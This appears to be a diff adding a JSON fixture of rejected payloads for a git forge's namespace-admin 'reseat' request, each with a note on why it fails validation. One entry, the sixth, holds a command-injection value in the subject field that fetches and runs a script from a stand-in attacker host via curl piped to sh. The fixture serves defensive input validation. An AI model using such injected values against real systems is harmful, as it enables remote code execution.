@@ -1,0 +1,75 @@
+[
+  {
+    "note": "`statement` is required: a reseat hands over the namespace root without any namespace admin choosing, and the audit record must say why.",
+    "payload": {
+      "namespace": "ns_01J8Z6Q4M2",
+      "subject": "did:webvh:QmCarolScid3:acme-vtc.example:carol"
+    }
+  },
+  {
+    "note": "`statement` is not empty.",
+    "payload": {
+      "namespace": "ns_01J8Z6Q4M2",
+      "subject": "did:webvh:QmCarolScid3:acme-vtc.example:carol",
+      "statement": ""
+    }
+  },
+  {
+    "note": "`subject` is a DID, not a forge login.",
+    "payload": {
+      "namespace": "ns_01J8Z6Q4M2",
+      "subject": "carol-c",
+      "statement": "Last admin left the community"
+    }
+  },
+  {
+    "note": "A reseat grants git.ns.admin and nothing else; there is no right to choose.",
+    "payload": {
+      "namespace": "ns_01J8Z6Q4M2",
+      "subject": "did:webvh:QmCarolScid3:acme-vtc.example:carol",
+      "statement": "Last admin left the community",
+      "right": "git.repo.create"
+    }
+  },
+  {
+    "note": "A reseated admin never expires: an expiring record would leave the namespace headless again when it lapsed.",
+    "payload": {
+      "namespace": "ns_01J8Z6Q4M2",
+      "subject": "did:webvh:QmCarolScid3:acme-vtc.example:carol",
+      "statement": "Last admin left the community",
+      "expiresAt": "2027-01-01T00:00:00Z"
+    }
+  },
+  {
+    "note": "`subject` is a DID in the W3C DID Core syntax, whose method-specific id admits only `A-Z a-z 0-9 . - _ :` and percent-encoded octets. `did:[a-z0-9]+:\\S+` let a command substitution through, and a surface that later quoted the value into a shell command ran it.",
+    "payload": {
+      "namespace": "ns_01J8Z6Q4M2",
+      "subject": "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
+      "statement": "Last admin left the community"
+    }
+  },
+  {
+    "note": "`subject` is a DID, and a DID has no whitespace in it.",
+    "payload": {
+      "namespace": "ns_01J8Z6Q4M2",
+      "subject": "did:web:acme-vtc.example:bob evil",
+      "statement": "Last admin left the community"
+    }
+  },
+  {
+    "note": "`subject` is a bare DID naming a party, not a DID URL: a `#` fragment (a verification-method id) is refused, as are a path and a query.",
+    "payload": {
+      "namespace": "ns_01J8Z6Q4M2",
+      "subject": "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK#z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK",
+      "statement": "Last admin left the community"
+    }
+  },
+  {
+    "note": "`subject` is a DID, whose method name is lowercase letters and digits only; `did:WebVH:` is not `did:webvh:`, and DIDs are compared by exact string.",
+    "payload": {
+      "namespace": "ns_01J8Z6Q4M2",
+      "subject": "did:WebVH:QmBobScid2:acme-vtc.example:bob",
+      "statement": "Last admin left the community"
+    }
+  }
+]
